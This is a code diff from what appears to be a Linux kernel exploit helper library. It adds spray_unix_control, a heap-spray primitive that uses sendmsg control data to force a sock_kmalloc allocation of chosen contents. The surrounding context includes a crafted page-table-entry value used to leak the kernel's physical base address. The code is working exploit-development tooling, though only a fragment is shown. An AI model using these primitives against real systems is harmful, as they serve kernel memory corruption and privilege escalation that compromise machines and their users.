@@ -4,6 +4,7 @@
 #include <pthread.h>
 #include <stdarg.h>
 #include <sys/resource.h>
+#include <sys/socket.h>
 #include <unistd.h>
 
 bool is_kernel_ptr(uint64_t val) {
@@ -178,3 +179,35 @@ void print_regs(pt_regs_t *regs) {
 // symbol in kernel data segment. => Can then be used to calculate the physical
 // base address of the kernel
 uint64_t stext_phys_leak_pte() { return 0x9c000 | 0x8000000000000067; }
+
+// Spray based on sock_kmalloc:
+//
+// Triggers at most one temporary sock_kmalloc() for msg_control in
+// ____sys_sendmsg() when msg_controllen exceeds the small on-stack buffer (36
+// bytes).
+//
+// The buffer is always freed before the syscall returns, so this is not
+// a persistent spray.
+//
+// allocation happens here:
+// https://github.com/torvalds/linux/blob/80234b5ab240f52fa45d201e899e207b9265ef91/net/socket.c#L2564
+static int g_sockfd[2] = {-1, -1};
+void spray_unix_control(void *data, size_t len) {
+    if (g_sockfd[0] == -1 || g_sockfd[1] == -1) {
+        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_sockfd) < 0) {
+            errExit("socketpair");
+        }
+    }
+    char payload = 'A';
+    struct iovec iov = {.iov_base = &payload, .iov_len = sizeof(payload)};
+    struct msghdr msg = {
+        .msg_iov = &iov,
+        .msg_iovlen = 1,
+        .msg_control = data,
+        .msg_controllen = len,
+    };
+
+    if (sendmsg(g_sockfd[1], &msg, 0) < 0) {
+        // perror("sendmsg");
+    }
+}
